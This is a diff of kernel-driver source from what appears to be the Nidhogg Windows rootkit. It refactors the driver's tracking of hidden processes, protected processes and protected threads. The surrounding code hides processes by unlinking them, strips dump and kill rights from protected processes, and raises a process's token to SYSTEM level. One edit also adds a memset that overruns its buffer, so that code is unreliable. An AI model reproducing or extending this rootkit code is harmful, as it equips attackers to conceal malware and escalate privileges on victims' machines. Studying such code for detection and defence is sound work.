@@ -2,18 +2,18 @@
 #include "ProcessUtils.hpp"
 
 ProcessUtils::ProcessUtils() {
-	this->HiddenProcesses.PidsCount = 0;
 	this->ProtectedProcesses.PidsCount = 0;
-	memset(&this->ProtectedProcesses, 0, sizeof(this->ProtectedProcesses));
+	this->ProtectedProcesses.LastIndex = 0;
+	memset(&this->ProtectedProcesses.Processes, 0, sizeof(this->ProtectedProcesses.Processes));
 
-	for (ULONG i = 0; i < MAX_PIDS; i++) {
-		this->HiddenProcesses.Processes[i].ListEntry = NULL;
-		this->HiddenProcesses.Processes[i].Pid = 0;
-	}
+	this->HiddenProcesses.PidsCount = 0;
+	this->HiddenProcesses.LastIndex = 0;
+	memset(&this->HiddenProcesses.Processes, 0, sizeof(this->HiddenProcesses.Processes));
 	this->ProcessesLock.Init();
 
 	this->ProtectedThreads.TidsCount = 0;
-	memset(&this->ProtectedThreads, 0, sizeof(this->ProtectedThreads));
+	this->ProtectedThreads.LastIndex = 0;
+	memset(&this->ProtectedThreads.Threads, 0, sizeof(this->ProtectedThreads.Threads));
 	this->ThreadsLock.Init();
 }
 
@@ -45,9 +45,6 @@ OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPE
 
 	auto Process = (PEPROCESS)Info->Object;
 	auto pid = HandleToULong(PsGetProcessId(Process));
-
-
-	AutoLock locker(NidhoggProccessUtils->GetProcessesLock());
 
 	// If the process was found on the list, remove permissions for dump / write process memory and kill the process.
 	if (NidhoggProccessUtils->FindProcess(pid)) {
@@ -89,9 +86,6 @@ OB_PREOP_CALLBACK_STATUS OnPreOpenThread(PVOID RegistrationContext, POB_PRE_OPER
 	// To avoid a situation when a process dies and the thread needs to be closed but it isn't closed, if the killer is its owning process, let it be killed.
 	if (callerPid == ownerPid || callerPid == SYSTEM_PROCESS_PID)
 		return OB_PREOP_SUCCESS;
-
-
-	AutoLock locker(NidhoggProccessUtils->GetThreadsLock());
 
 	// If the process was found on the list, remove permissions for terminating / setting context / suspending the thread.
 	if (NidhoggProccessUtils->FindThread(tid)) {
@@ -248,7 +242,7 @@ NTSTATUS ProcessUtils::ElevateProcess(ULONG pid) {
 	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);
 	UINT64 tokenOffset = GetTokenOffset();
 
-	if (!NT_SUCCESS(status))
+	if (!NT_SUCCESS(status) || tokenOffset == STATUS_UNSUCCESSFUL)
 		return status;
 
 	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &privilegedProcess);
@@ -281,6 +275,9 @@ bool ProcessUtils::AddHiddenProcess(PLIST_ENTRY entry, DWORD pid) {
 		if (this->HiddenProcesses.Processes[i].Pid == 0) {
 			this->HiddenProcesses.Processes[i].ListEntry = entry;
 			this->HiddenProcesses.Processes[i].Pid = pid;
+
+			if (i > this->HiddenProcesses.LastIndex)
+				this->HiddenProcesses.LastIndex = i;
 			this->HiddenProcesses.PidsCount++;
 			return true;
 		}
@@ -300,14 +297,20 @@ bool ProcessUtils::AddHiddenProcess(PLIST_ENTRY entry, DWORD pid) {
 */
 PLIST_ENTRY ProcessUtils::GetHiddenProcess(DWORD pid) {
 	PLIST_ENTRY entry = NULL;
+	ULONG newLastIndex = 0;
 
-	for (ULONG i = 0; i < this->HiddenProcesses.PidsCount; i++) {
+	for (ULONG i = 0; i <= this->HiddenProcesses.LastIndex; i++) {
 		if (this->HiddenProcesses.Processes[i].Pid == pid) {
 			entry = this->HiddenProcesses.Processes[i].ListEntry;
 			this->HiddenProcesses.Processes[i].Pid = 0;
+
+			if (i == this->HiddenProcesses.LastIndex)
+				this->HiddenProcesses.LastIndex = newLastIndex;
 			this->HiddenProcesses.PidsCount--;
 			break;
 		}
+		else if (this->HiddenProcesses.Processes[i].Pid != 0)
+			newLastIndex = i;
 	}
 	return entry;
 }
@@ -323,7 +326,9 @@ PLIST_ENTRY ProcessUtils::GetHiddenProcess(DWORD pid) {
 * @status [bool]  -- Whether found or not.
 */
 bool ProcessUtils::FindProcess(ULONG pid) {
-	for (ULONG i = 0; i < this->ProtectedProcesses.PidsCount; i++)
+	AutoLock locker(this->ProcessesLock);
+
+	for (ULONG i = 0; i <= this->ProtectedProcesses.LastIndex; i++)
 		if (this->ProtectedProcesses.Processes[i] == pid)
 			return true;
 	return false;
@@ -340,10 +345,15 @@ bool ProcessUtils::FindProcess(ULONG pid) {
 * @status [bool]  -- Whether successfully added or not.
 */
 bool ProcessUtils::AddProcess(ULONG pid) {
+	AutoLock locker(this->ProcessesLock);
+
 	for (ULONG i = 0; i < MAX_PIDS; i++)
 		if (this->ProtectedProcesses.Processes[i] == 0) {
 			this->ProtectedProcesses.Processes[i] = pid;
 			this->ProtectedProcesses.PidsCount++;
+
+			if (i > this->ProtectedProcesses.LastIndex)
+				this->ProtectedProcesses.LastIndex = i;
 			return true;
 		}
 	return false;
@@ -360,12 +370,21 @@ bool ProcessUtils::AddProcess(ULONG pid) {
 * @status [bool]  -- Whether successfully removed or not.
 */
 bool ProcessUtils::RemoveProcess(ULONG pid) {
-	for (ULONG i = 0; i < this->ProtectedProcesses.PidsCount; i++)
+	ULONG newLastIndex = 0;
+	AutoLock locker(this->ProcessesLock);
+
+	for (ULONG i = 0; i <= this->ProtectedProcesses.LastIndex; i++) {
 		if (this->ProtectedProcesses.Processes[i] == pid) {
 			this->ProtectedProcesses.Processes[i] = 0;
+
+			if (i == this->ProtectedProcesses.LastIndex)
+				this->ProtectedProcesses.LastIndex = newLastIndex;
 			this->ProtectedProcesses.PidsCount--;
 			return true;
 		}
+		else if (this->ProtectedProcesses.Processes[i] != 0)
+			newLastIndex = i;
+	}
 	return false;
 }
 
@@ -380,7 +399,9 @@ bool ProcessUtils::RemoveProcess(ULONG pid) {
 * @status [bool]  -- Whether found or not.
 */
 bool ProcessUtils::FindThread(ULONG tid) {
-	for (ULONG i = 0; i < this->ProtectedThreads.TidsCount; i++)
+	AutoLock locker(this->ThreadsLock);
+
+	for (ULONG i = 0; i <= this->ProtectedThreads.LastIndex; i++)
 		if (this->ProtectedThreads.Threads[i] == tid)
 			return true;
 	return false;
@@ -397,10 +418,15 @@ bool ProcessUtils::FindThread(ULONG tid) {
 * @status [bool]  -- Whether successfully added or not.
 */
 bool ProcessUtils::AddThread(ULONG tid) {
+	AutoLock locker(this->ThreadsLock);
+
 	for (ULONG i = 0; i < MAX_TIDS; i++)
 		if (this->ProtectedThreads.Threads[i] == 0) {
 			this->ProtectedThreads.Threads[i] = tid;
 			this->ProtectedThreads.TidsCount++;
+
+			if (i > this->ProtectedThreads.LastIndex)
+				this->ProtectedThreads.LastIndex = i;
 			return true;
 		}
 	return false;
@@ -417,12 +443,21 @@ bool ProcessUtils::AddThread(ULONG tid) {
 * @status [bool]  -- Whether successfully removed or not.
 */
 bool ProcessUtils::RemoveThread(ULONG tid) {
-	for (ULONG i = 0; i < this->ProtectedThreads.TidsCount; i++)
+	ULONG newLastIndex = 0;
+	AutoLock locker(this->ThreadsLock);
+
+	for (ULONG i = 0; i <= this->ProtectedThreads.LastIndex; i++) {
 		if (this->ProtectedThreads.Threads[i] == tid) {
 			this->ProtectedThreads.Threads[i] = 0;
+
+			if (i == this->ProtectedThreads.LastIndex)
+				this->ProtectedThreads.LastIndex = newLastIndex;
 			this->ProtectedThreads.TidsCount--;
 			return true;
 		}
+		else if (this->ProtectedThreads.Threads[i] != 0)
+			newLastIndex = i;
+	}
 	return false;
 }
 
@@ -520,6 +555,7 @@ void ProcessUtils::ClearProtectedProcesses() {
 
 	memset(&this->ProtectedProcesses.Processes, 0, sizeof(this->ProtectedProcesses.Processes));
 	this->ProtectedProcesses.PidsCount = 0;
+	this->ProtectedProcesses.LastIndex = 0;
 }
 
 /*
@@ -535,11 +571,9 @@ void ProcessUtils::ClearProtectedProcesses() {
 void ProcessUtils::ClearHiddenProcesses() {
 	AutoLock locker(this->ProcessesLock);
 
-	for (ULONG i = 0; i < this->HiddenProcesses.PidsCount; i++) {
-		this->HiddenProcesses.Processes[i].ListEntry = NULL;
-		this->HiddenProcesses.Processes[i].Pid = 0;
-	}
+	memset(&this->HiddenProcesses.Processes, 0, sizeof(this->HiddenProcesses.Processes));
 	this->HiddenProcesses.PidsCount = 0;
+	this->HiddenProcesses.LastIndex = 0;
 }
 
 /*
@@ -555,8 +589,9 @@ void ProcessUtils::ClearHiddenProcesses() {
 void ProcessUtils::ClearProtectedThreads() {
 	AutoLock locker(this->ThreadsLock);
 
-	memset(&this->ProtectedThreads.Threads, 0, sizeof(this->ProtectedThreads.Threads));
+	memset(&this->ProtectedThreads.Threads, 0, sizeof(this->ProtectedThreads.Threads) * MAX_TIDS);
 	this->ProtectedThreads.TidsCount = 0;
+	this->ProtectedThreads.LastIndex = 0;
 }
 
 /*
